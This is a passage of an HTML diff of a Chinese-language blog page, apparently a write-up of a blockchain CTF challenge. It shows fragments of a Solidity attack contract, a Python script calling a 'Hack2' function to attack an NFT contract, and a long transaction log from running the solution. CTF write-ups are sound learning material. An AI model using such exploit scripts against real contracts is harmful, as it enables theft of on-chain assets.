-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">16</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">16</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./target.sol&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -1232,60 +805,8 @@
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>根据上述分析编写链上交互脚本（已给出详细注释）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
+</span></span></code></pre></div><p>根据上述分析编写链上交互脚本（已给出详细注释）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 连接至链</span>
@@ -1331,134 +852,8 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 攻击 #2 NFT</span>
 </span></span><span class="line"><span class="cl"><span class="n">Hacker</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;Hack2&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行日志如下（以下结果是写题解复现时的）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">10</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mf">18.027</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">32</span> <span class="o">-</span> 
+</span></span></code></pre></div><p>运行日志如下（以下结果是写题解复现时的）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">10</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mf">18.027</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">32</span> <span class="o">-</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Chain</span><span class="p">][</span><span class="n">Connect</span><span class="p">]</span><span class="n">Successfully</span> <span class="n">connected</span> <span class="n">to</span> <span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">140.210</span><span class="o">.</span><span class="mf">217.225</span><span class="p">:</span><span class="mi">8545</span><span class="p">]</span><span class="o">.</span> <span class="p">[</span><span class="n">Delay</span><span class="p">]</span> <span class="mi">128</span> <span class="n">ms</span>
 </span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">10</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mf">18.056</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">241</span> <span class="o">-</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Account</span><span class="p">][</span><span class="n">Import</span><span class="p">]</span><span class="n">Successfully</span> <span class="n">import</span> <span class="n">account</span> <span class="p">[</span><span class="mh">0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class="p">]</span><span class="o">.</span>
@@ -1578,105 +973,14 @@
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Value</span><span class="p">]</span><span class="mi">0</span> <span class="p">[</span><span class="n">GasUsed</span><span class="p">]</span><span class="mi">191895</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Data</span><span class="p">]</span><span class="mh">0x5ac174d0</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Logs</span><span class="p">][</span><span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xbeab3a2bb824b124a8a1eb465eec003338d61b414db132d37e9b3a984fdcf010&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000002&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">}),</span> <span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class="p">),</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000002&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000000000000000000000000000000000000000000539&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">106743</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xb1b1dfd93983fc382eb52c6372825799d45069d9c8c1948850d3c3d61b94a151&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xd0b0d84b0131b1a84eaf05abbee6ca77946f250dbbe0ba8920aec922e7d0d39e&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span 